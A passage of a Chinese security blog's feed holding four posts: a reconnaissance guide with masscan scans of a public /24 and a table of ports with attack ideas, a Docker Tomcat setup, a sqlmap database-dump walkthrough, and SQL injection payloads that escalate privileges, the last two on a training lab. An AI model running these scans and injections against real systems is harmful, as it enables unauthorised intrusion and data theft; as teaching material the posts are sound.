        <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>这两天被分配了个信息收集的任务，本以为挺简单的，其实步骤还挺多,所以还是总结下比较稳妥</p><br><br><h4 id="第一步，找到目标的官方网站，收集子公司的名称和联系邮箱，还有其余备案网站"><a href="#第一步，找到目标的官方网站，收集子公司的名称和联系邮箱，还有其余备案网站" class="headerlink" title="第一步，找到目标的官方网站，收集子公司的名称和联系邮箱，还有其余备案网站"></a>第一步，找到目标的官方网站，收集子公司的名称和联系邮箱，还有其余备案网站</h4><p>1.官方网站，收集子公司的名称可以通过度娘，天眼查，企查查</p><p><img src="/2020/08/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/clipboard(12).png" alt></p><p>2.网站备案看有哪些主域名（或者改后缀可能也有其它域名）</p><p>&emsp;查看网站备案的工具有</p><p>&emsp;&emsp;站长工具查询网站备案，<a href="http://icp.chinaz.com/" target="_blank" rel="noopener">http://icp.chinaz.com/</a></p><p><img src="/2020/08/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/clipboard(10).png" alt></p><br><br><h4 id="第二步，收集子域名"><a href="#第二步，收集子域名" class="headerlink" title="第二步，收集子域名"></a>第二步，收集子域名</h4><p>1.GOOGLE搜索</p><p>&emsp;格式是<code>site:example.com -www</code>，还有许多搜索方法，不过需要多学习些语法</p><p><img src="/2020/08/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/clipboard(5).png" alt></p><p>2.Dnsdb，<a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a></p><p><img src="/2020/08/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/clipboard(4).png" alt></p><p>3.其他类似的在线工具</p><p>&emsp;<a href="https://dnsdumpster.com/" target="_blank" rel="noopener">https://dnsdumpster.com/</a> </p><p>&emsp;<a href="https://rapiddns.io/subdomain" target="_blank" rel="noopener">https://rapiddns.io/subdomain</a></p><p>4.子域名爆破工具</p><p>&emsp;Sublist3r</p><p>&emsp;OneForAll</p><p>5.使用FOFA直接搜索host=”xxx.com”</p><p><img src="/2020/08/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/clipboard(8).png" alt></p><br><br><h4 id="第三步，测试收集到的所有域名是否使用了CDN"><a href="#第三步，测试收集到的所有域名是否使用了CDN" class="headerlink" title="第三步，测试收集到的所有域名是否使用了CDN"></a>第三步，测试收集到的所有域名是否使用了CDN</h4><p>用多Ping去查看响应的IP,看看目标有没有使用CDN</p><p>&emsp;<a href="https://ping.aizhan.com/" target="_blank" rel="noopener">https://ping.aizhan.com/</a> （有时候不稳）</p><p><img src="/2020/08/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/clipboard(1).png" alt></p><p>&emsp;<a href="http://ping.chinaz.com/" target="_blank" rel="noopener">http://ping.chinaz.com/</a> （推荐使用）</p><p><img src="/2020/08/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/clipboard(9).png" alt></p><p>&emsp;如果返回的IP重复挺多的，那应该就是目标的真实IP,可尝试通过IP去访问目标，如果访问不了，可以通过IP地址反查域名确认，<a href="https://tools.ipip.net/ipdomain.php" target="_blank" rel="noopener">https://tools.ipip.net/ipdomain.php</a></p><p><img src="/2020/08/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/clipboard(6).png" alt></p><br><br><h4 id="第四步，绕过CDN"><a href="#第四步，绕过CDN" class="headerlink" title="第四步，绕过CDN"></a>第四步，绕过CDN</h4><p>1.通过注册查看邮件原文（有些网站有通过邮件找回密码的功能，或者注册邮箱认证）</p><p><img src="/2020/08/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/clipboard(14).png" alt></p><p>&emsp;原文里的IP地址</p><p><img src="/2020/08/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/clipboard(3).png" alt></p><p>2.将网址或者IP放到网络空间搜索FOFA里，有概率可以直接拿到网站的IP，可以看到网站用了什么容器，服务器是啥系统，甚至还能看开放了啥端口（FOFA：title=”公司名”等特征 ）</p><p><img src="/2020/08/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/clipboard(7).png" alt></p><p>3.通过查找到的子域名，辅助查找真实IP（有些网站子域名没有配置CDN）</p><p>4.使用国外节点Ping</p><p>&emsp;<a href="https://asm.ca.com/en/ping.php" target="_blank" rel="noopener">https://asm.ca.com/en/ping.php</a></p><p>5.配置不当</p><p>&emsp;可访问探针phpinfo</p><p>&emsp;站点同时支持http和https访问，CDN只配置 https协议，那么这时访问http就可以轻易绕过。</p><br><br><h4 id="第五步，探测旁站和C段"><a href="#第五步，探测旁站和C段" class="headerlink" title="第五步，探测旁站和C段"></a>第五步，探测旁站和C段</h4><p>旁站：旁站是和目标网站在同一台服务器上的其它的网站</p><p>&emsp;在线查询，<a href="http://www.webscan.cc/" target="_blank" rel="noopener">http://www.webscan.cc/</a></p><p><img src="/2020/08/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/clipboard(13).png" alt></p><p>&emsp;使用FOFA直接搜索IP或者（title=”xxx” &amp;&amp; host=”xxx.com”）</p><br><p>C段：C段是和目标服务器ip处在同一个C段的其它服务器</p><p>&emsp;1.使用北极熊扫描器或者Nmap探测同网段主机，尝试存活主机</p><p>&emsp;2.使用FOFA直接搜索IP或者（title=”xxx” &amp;&amp; host=”xxx.com”）</p><p>&emsp;3.ASN码查询C段（大型企业才有）</p><p>&emsp;&emsp;先查询IP的ASN，<a href="https://tools.ipip.net/as.php" target="_blank" rel="noopener">https://tools.ipip.net/as.php</a><br>&emsp;&emsp;然后根据ASN查询目标拥有的资产，<a href="https://www.cidr-report.org/cgi-bin/as-report?as=ASN码" target="_blank" rel="noopener">https://www.cidr-report.org/cgi-bin/as-report?as=ASN码</a></p><br><br><h4 id="第六步，通过已知资产，在SRC漏洞库中搜索信息"><a href="#第六步，通过已知资产，在SRC漏洞库中搜索信息" class="headerlink" title="第六步，通过已知资产，在SRC漏洞库中搜索信息"></a>第六步，通过已知资产，在SRC漏洞库中搜索信息</h4><p>拿到子域的一些资产可以查找已公开漏洞，例如搜索 某某服VPN<br>&emsp;乌云镜像：<a href="https://wooyun.x10sec.org/" target="_blank" rel="noopener">https://wooyun.x10sec.org/</a></p><p><img src="/2020/08/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/clipboard.png" alt></p><br><br><h4 id="第七步，查找Web指纹（网站架构）"><a href="#第七步，查找Web指纹（网站架构）" class="headerlink" title="第七步，查找Web指纹（网站架构）"></a>第七步，查找Web指纹（网站架构）</h4><p>查找CMS框架、OS、脚本语言、中间件容器 （使用的版本是否存在历史漏洞）</p><p>相关工具</p><p>&emsp;1.wappalyzer（一款chrom插件）</p><p><img src="/2020/08/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/clipboard(2).png" alt></p><p>&emsp;2.云悉指纹（需要邀请码注册）<br>&emsp;3.whatweb</p><p><img src="/2020/08/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/clipboard(11).png" alt></p><br><br><h4 id="第八步，扫描网站开放端口"><a href="#第八步，扫描网站开放端口" class="headerlink" title="第八步，扫描网站开放端口"></a>第八步，扫描网站开放端口</h4><p>在收集了许多域名和IP后，用<code>masscan</code>扫一扫目标的端口，可以多写些高危端口，减小扫描范围，提高效率</p><pre><code>sudo masscan -p 端口 目标IP --rate 速率    #只扫相关性高点的几个sudo masscan -p 端口 139.224.94.0/24 --rate 1000000    #全C段扫描</code></pre><br><p>一些风险端口</p><table><thead><tr><th>tcp 20,21</th><th>FTP（文件传输协议）</th><th>允许匿名的上传下载,爆破,嗅探,win提权,远程执行(proftpd 1.3.5),各类后门(proftpd,vsftp 2.3.4)</th></tr></thead><tbody><tr><td>tcp 22</td><td>SSH （安全外壳协议 ）</td><td>可根据已搜集到的信息尝试爆破,v1版本可中间人,ssh隧道及内网代理转发,文件传输等等</td></tr><tr><td>tcp 23</td><td>Telnet （ 远程终端协议）</td><td>爆破,嗅探,一般常用于路由,交换登陆,可尝试弱口令</td></tr><tr><td>tcp 25</td><td>SMTP（简单邮件传输协议）</td><td>邮件伪造,vrfy/expn查询邮件用户信息,可使用smtp-user-enum工具来自动跑</td></tr><tr><td>tcp/udp 53</td><td>DNS（域名系统）</td><td>允许区域传送,dns劫持,缓存投毒,欺骗以及各种基于dns隧道的远控</td></tr><tr><td>tcp/udp 69</td><td>TFTP （简单文件传送协议 ）</td><td>尝试下载目标及其的各类重要配置文件</td></tr><tr><td>tcp 80-89,443,8440-8450,8080-8089</td><td>各种常用的Web服务端口</td><td>可尝试经典的topn,vpn,owa,webmail,目标oa,各类Java控制台,各类服务器Web管理面板,各类Web中间件漏洞利用,各类Web框架漏洞利用等等……</td></tr><tr><td>tcp 110</td><td>POP3（邮局协议版本3 ）</td><td>可尝试爆破,嗅探</td></tr><tr><td>tcp 111,2049</td><td>NFS（网络文件系统）</td><td>权限配置不当</td></tr><tr><td>tcp 137,139,445</td><td>SMB（NETBIOS协议）</td><td>可尝试爆破以及smb自身的各种远程执行类漏洞利用,如,ms08-067,ms17-010,嗅探等……</td></tr><tr><td>tcp 143</td><td>IMAP（邮件访问协议）</td><td>可尝试爆破</td></tr><tr><td>udp 161</td><td>SNMP（简单网络管理协议）</td><td>爆破默认团队字符串,搜集目标内网信息</td></tr><tr><td>tcp 389</td><td>LDAP（ 轻量目录访问协议 ）</td><td>ldap注入,允许匿名访问,弱口令</td></tr><tr><td>tcp 512,513,514</td><td>Linux rexec （远程登录）</td><td>可爆破,rlogin登陆</td></tr><tr><td>tcp 873</td><td>Rsync （数据镜像备份工具）</td><td>匿名访问,文件上传</td></tr><tr><td>tcp 1194</td><td>OpenVPN（虚拟专用通道）</td><td>想办法钓VPN账号,进内网</td></tr><tr><td>tcp 1352</td><td>Lotus（Lotus软件）</td><td>弱口令,信息泄漏,爆破</td></tr><tr><td>tcp 1433</td><td>SQL Server（数据库管理系统）</td><td>注入,提权,sa弱口令,爆破</td></tr><tr><td>tcp 1521</td><td>Oracle（甲骨文数据库）</td><td>tns爆破,注入,弹shell…</td></tr><tr><td>tcp 1500</td><td>ISPmanager（ 主机控制面板）</td><td>弱口令</td></tr><tr><td>tcp 1723</td><td>PPTP（点对点隧道协议 ）</td><td>爆破,想办法钓VPN账号,进内网</td></tr><tr><td>tcp 2082,2083</td><td>cPanel （虚拟机控制系统 ）</td><td>弱口令</td></tr><tr><td>tcp 2181</td><td>ZooKeeper（分布式系统的可靠协调系统 ）</td><td>未授权访问</td></tr><tr><td>tcp 2601,2604</td><td>Zebra （zebra路由）</td><td>默认密码zerbra</td></tr><tr><td>tcp 3128</td><td>Squid （代理缓存服务器）</td><td>弱口令</td></tr><tr><td>tcp 3312,3311</td><td>kangle（web服务器）</td><td>弱口令</td></tr><tr><td>tcp 3306</td><td>MySQL（数据库）</td><td>注入,提权,爆破</td></tr><tr><td>tcp 3389</td><td>Windows rdp（桌面协议）</td><td>shift后门[需要03以下的系统],爆破,ms12-020</td></tr><tr><td>tcp 3690</td><td>SVN（开放源代码的版本控制系统）</td><td>svn泄露,未授权访问</td></tr><tr><td>tcp 4848</td><td>GlassFish（应用服务器）</td><td>弱口令</td></tr><tr><td>tcp 5000</td><td>Sybase/DB2（数据库）</td><td>爆破,注入</td></tr><tr><td>tcp 5432</td><td>PostgreSQL（数据库）</td><td>爆破,注入,弱口令</td></tr><tr><td>tcp 5900,5901,5902</td><td>VNC（虚拟网络控制台，远控）</td><td>弱口令爆破</td></tr><tr><td>tcp 5984</td><td>CouchDB（数据库）</td><td>未授权导致的任意指令执行</td></tr><tr><td>tcp 6379</td><td>Redis（数据库）</td><td>可尝试未授权访问,弱口令爆破</td></tr><tr><td>tcp 7001,7002</td><td>WebLogic（WEB应用系统）</td><td>Java反序列化,弱口令</td></tr><tr><td>tcp 7778</td><td>Kloxo（虚拟主机管理系统）</td><td>主机面板登录</td></tr><tr><td>tcp 8000</td><td>Ajenti（Linux服务器管理面板）</td><td>弱口令</td></tr><tr><td>tcp 8443</td><td>Plesk（虚拟主机管理面板）</td><td>弱口令</td></tr><tr><td>tcp 8069</td><td>Zabbix （系统网络监视）</td><td>远程执行,SQL注入</td></tr><tr><td>tcp 8080-8089</td><td>Jenkins,JBoss （应用服务器）</td><td>反序列化,控制台弱口令</td></tr><tr><td>tcp 9080-9081,9090</td><td>WebSphere（应用服务器）</td><td>Java反序列化/弱口令</td></tr><tr><td>tcp 9200,9300</td><td>ElasticSearch （Lucene的搜索服务器）</td><td>远程执行</td></tr><tr><td>tcp 11211</td><td>Memcached（缓存系统）</td><td>未授权访问</td></tr><tr><td>tcp 27017,27018</td><td>MongoDB（数据库）</td><td>爆破,未授权访问</td></tr><tr><td>tcp 50070,50030</td><td>Hadoop（分布式文件系统）</td><td>默认端口未授权访问</td></tr></tbody></table><p>为了效率，可以直接把风险端口加进去</p><pre><code>masscan -p1-1024,1194,1352,1433,1521,1500,1723,2082,2083,2181,2601,2604,3128,3312,3311,3306,3389,3690,4848,5000,5432,5900,5901,5902,5984,6379,7001,7002,7778,8000,8443,8069,8080-8089,9080-9081,9090,9200,9300,11211,27017,27018,50070,50030 目标IP --rate=1000</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用docker部署tomcat环境</title>
      <link href="/2020/08/10/%E7%94%A8docker%E9%83%A8%E7%BD%B2tomcat%E7%8E%AF%E5%A2%83/"/>
      <url>/2020/08/10/%E7%94%A8docker%E9%83%A8%E7%BD%B2tomcat%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><ul><li>最近因为想学习下jsp，所以需要学习tomcat的部署，但是整来整去，发现还是docker香，所以我索性就用docker来搭建这个环境了，顺便复习波docker的使用</li></ul><h5 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h5><ul><li>首先我们选择一个好的镜像，好的镜像很重要，可以通过关键词搜索自己想要的镜像</li></ul><pre><code>docker search tomcat</code></pre><p><img src="/2020/08/10/%E7%94%A8docker%E9%83%A8%E7%BD%B2tomcat%E7%8E%AF%E5%A2%83/clipboard(2).png" alt></p><h5 id="选取star最高的镜像"><a href="#选取star最高的镜像" class="headerlink" title="选取star最高的镜像"></a>选取star最高的镜像</h5><ul><li>将镜像pull下来</li></ul><pre><code>docker pull tomcat</code></pre><p><img src="/2020/08/10/%E7%94%A8docker%E9%83%A8%E7%BD%B2tomcat%E7%8E%AF%E5%A2%83/clipboard(5).png" alt></p><h5 id="查看是否成功下载到镜像"><a href="#查看是否成功下载到镜像" class="headerlink" title="查看是否成功下载到镜像"></a>查看是否成功下载到镜像</h5><pre><code>docker images</code></pre><p><img src="/2020/08/10/%E7%94%A8docker%E9%83%A8%E7%BD%B2tomcat%E7%8E%AF%E5%A2%83/clipboard(7).png" alt></p><h5 id="指定端口运行容器"><a href="#指定端口运行容器" class="headerlink" title="指定端口运行容器"></a>指定端口运行容器</h5><pre><code>docker run -d -p 6556:8080 tomcat参数-d 后台运行容器参数-p 指定端口映射 6556:8080 就是将容器的8080短裤映射到本地的6556端口，通过6556端口就能访问网页了</code></pre><p><img src="/2020/08/10/%E7%94%A8docker%E9%83%A8%E7%BD%B2tomcat%E7%8E%AF%E5%A2%83/clipboard(6).png" alt></p><h5 id="查看容器ID"><a href="#查看容器ID" class="headerlink" title="查看容器ID"></a>查看容器ID</h5><pre><code>docker ps -a</code></pre><p><img src="/2020/08/10/%E7%94%A8docker%E9%83%A8%E7%BD%B2tomcat%E7%8E%AF%E5%A2%83/clipboard(1).png" alt></p><h5 id="进入到容器里"><a href="#进入到容器里" class="headerlink" title="进入到容器里"></a>进入到容器里</h5><pre><code>docker exec -it d71a17108efe /bin/bashd71a17108efe 容器的ID-i: 交互式操作-t: 终端</code></pre><p><img src="/2020/08/10/%E7%94%A8docker%E9%83%A8%E7%BD%B2tomcat%E7%8E%AF%E5%A2%83/clipboard(9).png" alt></p><h5 id="tomcat里的配置"><a href="#tomcat里的配置" class="headerlink" title="tomcat里的配置"></a>tomcat里的配置</h5><ul><li>删除文件夹webapps</li></ul><pre><code>rm -rf webapps</code></pre><p><img src="/2020/08/10/%E7%94%A8docker%E9%83%A8%E7%BD%B2tomcat%E7%8E%AF%E5%A2%83/clipboard(10).png" alt></p><ul><li>将webapps.dist修改为webapps</li></ul><pre><code>mv webapps.dist webapps        记住一定要先删除webapps，否则将会把webapps.dist移到webapps文件夹里</code></pre><p><img src="/2020/08/10/%E7%94%A8docker%E9%83%A8%E7%BD%B2tomcat%E7%8E%AF%E5%A2%83/clipboard(8).png" alt></p><h5 id="重启容器"><a href="#重启容器" class="headerlink" title="重启容器"></a>重启容器</h5><ul><li>先exit退出容器，回到docker的控制端</li></ul><pre><code>docker restart d71a17108efe</code></pre><p><img src="/2020/08/10/%E7%94%A8docker%E9%83%A8%E7%BD%B2tomcat%E7%8E%AF%E5%A2%83/clipboard.png" alt></p><ul><li>再查看下运行状态，确定容器在运行中</li></ul><p><img src="/2020/08/10/%E7%94%A8docker%E9%83%A8%E7%BD%B2tomcat%E7%8E%AF%E5%A2%83/clipboard(3).png" alt></p><h5 id="访问浏览器"><a href="#访问浏览器" class="headerlink" title="访问浏览器"></a>访问浏览器</h5><ul><li>打开浏览器访问127.0.0.1:6556</li></ul><p><img src="/2020/08/10/%E7%94%A8docker%E9%83%A8%E7%BD%B2tomcat%E7%8E%AF%E5%A2%83/clipboard(4).png" alt></p><h5 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h5><ul><li>最后就没有最后了，记得好好学jsp</li></ul>]]></content>
      
      
      <categories>
          
          <category> 环境搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>（二）SQL注入—sqlmap注入</title>
      <link href="/2020/08/05/%EF%BC%88%E4%BA%8C%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94sqlmap%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/08/05/%EF%BC%88%E4%BA%8C%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94sqlmap%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<ul><li>上篇我们说到如何利用报错信息进行sql注入，那么本篇我们将会使用工具sqlmap对网站进行爆库</li><li>还是上篇的靶场，靶场由<a href="https://zhishihezi.net/box/" target="_blank" rel="noopener">知识盒子</a>提供，地址：<a href="https://tofu.exeye.run/sql/log_page" target="_blank" rel="noopener">https://tofu.exeye.run/sql/log_page</a></li></ul><p><img src="/2020/08/05/%EF%BC%88%E4%BA%8C%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94sqlmap%E6%B3%A8%E5%85%A5/clipboard(5).png" alt="登录界面"></p><ul><li>因为登录发出的是POST请求，所以我们首先需要用burp先开启抓包，随便输入用户名和密码，点击登录</li></ul><p><img src="/2020/08/05/%EF%BC%88%E4%BA%8C%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94sqlmap%E6%B3%A8%E5%85%A5/clipboard(2).png" alt="网站发起的POST请求"></p><ul><li>然后将POST请求复制到记事本里保存为1.txt</li></ul><p><img src="/2020/08/05/%EF%BC%88%E4%BA%8C%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94sqlmap%E6%B3%A8%E5%85%A5/clipboard(4).png" alt></p><ul><li><p>然后在当前目录开启终端，需要用到的命令为</p></li><li><pre><code>sqlmap -r &quot;1.txt&quot; -p psw --dbs           -p参数意思是指定参数psw进行注入，因为上篇我们手动测试到密码处有注入点--dbs的意思是爆出数据库名称</code></pre></li></ul><ul><li>运行该命令，爆出数据库的所有库名</li></ul><p><img src="/2020/08/05/%EF%BC%88%E4%BA%8C%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94sqlmap%E6%B3%A8%E5%85%A5/clipboard(1).png" alt="sqlmap正在尝试注入"></p><ul><li>成功爆出两个库名，<code>information_schema</code>和<code>twosecu1_ques_2</code></li></ul><p><img src="/2020/08/05/%EF%BC%88%E4%BA%8C%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94sqlmap%E6%B3%A8%E5%85%A5/clipboard(6).png" alt></p><ul><li><p>接下来选择一个数据库继续深入，我选择的是库<code>information_schema</code>，查看有哪些表，运行命令为：</p></li><li><pre><code>sqlmap -r &quot;1.txt&quot; -p psw -D information_schema --tables-D的参数是指定数据库名--tables参数意思是列出数据库的所有表名</code></pre></li></ul><ul><li>运行命令，可以得到指定数据库的所有表名</li></ul><p><img src="/2020/08/05/%EF%BC%88%E4%BA%8C%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94sqlmap%E6%B3%A8%E5%85%A5/clipboard(3).png" alt></p><ul><li><p>同理，获得一个表名之后我们也可以指定他的字段,比如列出表<code>ALL_PLUGINS</code>的字段</p></li><li><pre><code>sqlmap -r &quot;1.txt&quot; -p psw -D information_schema -T ALL_PLUGINS --columns参数-T是指定表名的意思--columns 列出指定表的所有字段</code></pre></li></ul><ul><li>运行命令，查看<code>ALL_PLUGINS</code>的字段</li></ul><p><img src="/2020/08/05/%EF%BC%88%E4%BA%8C%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94sqlmap%E6%B3%A8%E5%85%A5/clipboard.png" alt></p><ul><li><p>最后就是爆出字段的内容了，运行命令为：</p></li><li><pre><code>sqlmap -r &quot;1.txt&quot; -p psw -D information_schema -T ALL_PLUGINS -C PLUGIN_LIBRARY --dump参数-C 用于指定字段名--dump 爆出字段的值</code></pre></li></ul><ul><li>运行命令，就能列出该字段的所有值了</li></ul><p><img src="/2020/08/05/%EF%BC%88%E4%BA%8C%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94sqlmap%E6%B3%A8%E5%85%A5/clipboard(7).png" alt></p><ul><li>所以只要有注入点，就能够指定参数，用sqlmap就能很方便地列出数据库所有的数据。</li></ul><br><ul><li><p>拓展：sqlmap常用命令</p><p>检查注入点 </p><pre><code>sqlmap -u &quot;http://ooxx.com/a.php?id=1&quot; </code></pre><br><p>列数据库信息 </p><pre><code>sqlmap -u &quot;http://ooxx.com/a.php?id=1&quot; --dbs </code></pre><p><br>指定数据库名列出所有表</p><pre><code> sqlmap -u &quot;http://ooxx.com/a.php?id=1&quot; -D dbsname --tables </code></pre><p><br>指定数据库名表名列出所有字段</p><pre><code> sqlmap -u &quot;http://ooxx.com/a.php?id=1&quot; -D dbsname -T tablename --columns </code></pre><p><br>指定数据库名表名字段dump出指定字段</p><pre><code>sqlmap -u &quot;http://ooxx.com/a.php?id=1&quot; -D dbsname -T tablename -C columnname --dump </code></pre><p><br>cookie 注入      </p><pre><code>--cookie=COOKIE                 在需要登录的地方，需要登录后的cookie </code></pre><p><br>执行指定的 SQL 语句 </p><pre><code>--sql-query=QUERY </code></pre><p><br>代理注入</p><pre><code> --proxy=&quot;(http|https|socks4|socks5)://127.0.0.1:8087&quot;    支持多种协议</code></pre><p><br>POST注入</p><pre><code>sqlmap -r 1.txt                     如果cookie很长，或者需要使用post注入，请抓包将数据存入1.txt中</code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>（一）SQL注入—基础</title>
      <link href="/2020/07/31/%EF%BC%88%E4%B8%80%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%9F%BA%E7%A1%80/"/>
      <url>/2020/07/31/%EF%BC%88%E4%B8%80%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<ul><li>在SQL注入的过程中，如果网站的Web服务器开启了错误回显，则会为攻击者提供极大的便利，比如攻击者在参数中输入一个单引号<code>&#39;</code>， 引起执行查询语句的语法错误，服务器直接返回了错误信息。</li><li>下面我们来看个例子    靶场由<a href="https://zhishihezi.net/box/" target="_blank" rel="noopener">知识盒子</a>提供，地址：<a href="https://tofu.exeye.run/sql/log_page" target="_blank" rel="noopener">https://tofu.exeye.run/sql/log_page</a></li><li>这是一个登录页面</li></ul><p><img src="/2020/07/31/%EF%BC%88%E4%B8%80%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%9F%BA%E7%A1%80/clipboard(8).png" alt="登录界面"></p><ul><li>这个登录界面给了我们默认的账户名：<code>staff_jack</code></li><li>然后我们随便输入一个密码，开启抓包，点击登录</li></ul><p><img src="/2020/07/31/%EF%BC%88%E4%B8%80%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%9F%BA%E7%A1%80/clipboard.png" alt></p><ul><li>将这个包发送到<code>Repeater</code>,直接发送，我们可以看到响应的信息提示账号密码错误</li></ul><p><img src="/2020/07/31/%EF%BC%88%E4%B8%80%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%9F%BA%E7%A1%80/clipboard(7).png" alt></p><ul><li>那么我们将123直接改成一个单引号<code>&#39;</code>看看能不能造成语法错误，让他回显错误</li><li>点击Go收到响应，可以看到确实收到错误代码，而且提示了sql语法错误</li></ul><p><img src="/2020/07/31/%EF%BC%88%E4%B8%80%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%9F%BA%E7%A1%80/clipboard(10).png" alt></p><ul><li><p>所以这个地方可能存在sql注入，接下来我们可以尝试在语句中加入or‘1=1’让语句无条件返回正确值</p></li><li><p>那么就应该在密码处输入</p></li><li><pre class=" language-sql"><code class="language-sql"><span class="token number">123</span>'<span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment" spellcheck="true">#  </span><span class="token comment" spellcheck="true">#这里123后面的单引号是为了闭合前面的引号,#是为了注释掉后面的引号</span><span class="token comment" spellcheck="true">#所以构造的语句完整是</span><span class="token keyword">select</span> s_user<span class="token punctuation">,</span>s_power <span class="token keyword">from</span> staff <span class="token keyword">where</span> s_user <span class="token operator">=</span><span class="token string">'staff_jack'</span> <span class="token operator">and</span> s_psw <span class="token operator">=</span><span class="token string">'123'</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span></code></pre></li></ul><ul><li>改完密码后提交后响应内容是这样的</li></ul><p><img src="/2020/07/31/%EF%BC%88%E4%B8%80%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%9F%BA%E7%A1%80/clipboard(4).png" alt></p><ul><li>可以看到返回的code值为0，但是权限不够，直接登录网站也可以看到</li></ul><p><img src="/2020/07/31/%EF%BC%88%E4%B8%80%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%9F%BA%E7%A1%80/clipboard(1).png" alt></p><ul><li><p>我猜想响应内容中，<code>s_power</code>字段应该就是用来标记权限用的</p></li><li><p>既然可以注入’1=1‘，那为什么不可以直接注入update的语句将权限字段改为1呢</p></li><li><p>所以要修改权限，payload就应该改成这样：</p></li><li><pre class=" language-sql"><code class="language-sql"><span class="token number">123</span><span class="token string">' OR '</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token string">';update staff set s_power=1 where s_user='</span>staff_bob'<span class="token comment" spellcheck="true">#</span>这段的意思从表staff中找出用户staff_bob，然后将权限字段s_power<span class="token operator">=</span><span class="token number">1</span>改为<span class="token number">1</span></code></pre></li></ul><ul><li>接下来再看看响应内容，可以看到返回的是404 not found</li></ul><p><img src="/2020/07/31/%EF%BC%88%E4%B8%80%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%9F%BA%E7%A1%80/clipboard(9).png" alt></p><ul><li>返回404，说明我们的代码可能执行成功了，导致后端没有返回值</li><li>接着我们可以尝试下重新登录账号，成功修改权限拿到flag</li></ul><p><img src="/2020/07/31/%EF%BC%88%E4%B8%80%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%9F%BA%E7%A1%80/clipboard(5).png" 